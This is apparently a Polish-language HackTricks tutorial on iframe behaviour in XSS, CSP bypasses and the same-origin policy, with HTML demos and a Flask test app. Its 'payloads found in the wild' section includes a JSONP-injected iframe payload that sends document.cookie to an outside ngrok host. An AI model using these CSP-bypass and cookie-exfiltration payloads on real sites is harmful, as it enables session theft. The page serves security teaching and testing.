# Iframes w XSS, CSP i SOP

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Iframes w XSS

Istniej 3 sposoby na wskazanie zawartoci strony w iframe:

* Poprzez `src` wskazujcy URL (URL mo偶e by cross origin lub same origin)
* Poprzez `src` wskazujcy zawarto za pomoc protokou `data:`
* Poprzez `srcdoc` wskazujcy zawarto

**Dostp do zmiennych rodzica i dziecka**
```html
<html>
<script>
var secret = "31337s3cr37t";
</script>

<iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe id="if2" src="child.html"></iframe>
<iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

<script>
function access_children_vars(){
alert(if1.secret);
alert(if2.secret);
alert(if3.secret);
alert(if4.secret);
}
setTimeout(access_children_vars, 3000);
</script>
</html>
```

```html
<!-- content of child.html -->
<script>
var secret="child secret";
alert(parent.secret)
</script>
```
Jeli uzyskasz dostp do poprzedniego html za porednictwem serwera http (takiego jak `python3 -m http.server`), zauwa偶ysz, 偶e wszystkie skrypty bd wykonywane (poniewa偶 nie ma CSP, kt贸re by to uniemo偶liwiao). **Rodzic nie bdzie m贸g uzyska dostpu do zmiennej `secret` wewntrz 偶adnego iframe** i **tylko iframes if2 i if3 (kt贸re s uwa偶ane za tej samej witryny) mog uzyska dostp do sekretnych** w oryginalnym oknie.\
Zauwa偶, 偶e if4 jest uwa偶any za majcy `null` origin.

### Iframes z CSP <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>

{% hint style="info" %}
Prosz zauwa偶y, 偶e w poni偶szych obejciach odpowied藕 na stron w iframe nie zawiera 偶adnego nag贸wka CSP, kt贸ry uniemo偶liwia wykonanie JS.
{% endhint %}

Warto `self` w `script-src` nie pozwoli na wykonanie kodu JS przy u偶yciu protokou `data:` lub atrybutu `srcdoc`.\
Jednak nawet warto `none` CSP pozwoli na wykonanie iframe, kt贸re umieszczaj adres URL (peny lub tylko cie偶k) w atrybucie `src`.\
Dlatego mo偶liwe jest obejcie CSP strony za pomoc:
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='">
</head>
<script>
var secret = "31337s3cr37t";
</script>
<iframe id="if1" src="child.html"></iframe>
<iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```
Zauwa偶, 偶e **poprzedni CSP zezwala tylko na wykonanie skryptu inline**.\
Jednak **tylko skrypty `if1` i `if2` bd wykonywane, ale tylko `if1` bdzie mogo uzyska dostp do tajemnicy rodzica**.

![](<../../.gitbook/assets/image (372).png>)

Dlatego mo偶liwe jest **obejcie CSP, jeli mo偶esz przesa plik JS na serwer i zaadowa go za pomoc iframe, nawet przy `script-src 'none'`**. To **mo偶na potencjalnie r贸wnie偶 zrobi, nadu偶ywajc punktu kocowego JSONP w tej samej witrynie**.

Mo偶esz to przetestowa w nastpujcym scenariuszu, w kt贸rym ciasteczko jest kradzione, nawet przy `script-src 'none'`. Po prostu uruchom aplikacj i uzyskaj do niej dostp za pomoc przegldarki:
```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
resp.headers['Content-Security-Policy'] = "script-src 'self'"
resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
return resp

@app.route("/cookie_s.html")
def cookie_s():
return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
app.run()
```
### Inne adunki znalezione w dziczy <a href="#other_payloads_found_on_the_wild_64" id="other_payloads_found_on_the_wild_64"></a>
```html
<!-- This one requires the data: scheme to be allowed -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```
### Iframe sandbox

Zawarto w iframe mo偶e by poddana dodatkowym ograniczeniom za pomoc atrybutu `sandbox`. Domylnie ten atrybut nie jest stosowany, co oznacza, 偶e nie ma 偶adnych ogranicze.

Gdy jest u偶ywany, atrybut `sandbox` nakada kilka ogranicze:

* Zawarto jest traktowana tak, jakby pochodzia z unikalnego 藕r贸da.
* Ka偶da pr贸ba przesania formularzy jest blokowana.
* Wykonanie skrypt贸w jest zabronione.
* Dostp do niekt贸rych interfejs贸w API jest wyczony.
* Zapobiega interakcji link贸w z innymi kontekstami przegldania.
* U偶ycie wtyczek za pomoc `<embed>`, `<object>`, `<applet>` lub podobnych tag贸w jest zabronione.
* Nawigacja w g贸rnym kontekcie przegldania przez sam zawarto jest zablokowana.
* Funkcje, kt贸re s uruchamiane automatycznie, takie jak odtwarzanie wideo lub automatyczne ustawianie fokusu na kontrolkach formularzy, s blokowane.

Warto atrybutu mo偶e by pozostawiona pusta (`sandbox=""`), aby zastosowa wszystkie powy偶sze ograniczenia. Alternatywnie, mo偶e by ustawiona na list specyficznych wartoci oddzielonych spacjami, kt贸re zwalniaj iframe z niekt贸rych ogranicze.
```html
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```
## Iframes w SOP

Sprawd藕 nastpujce strony:

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
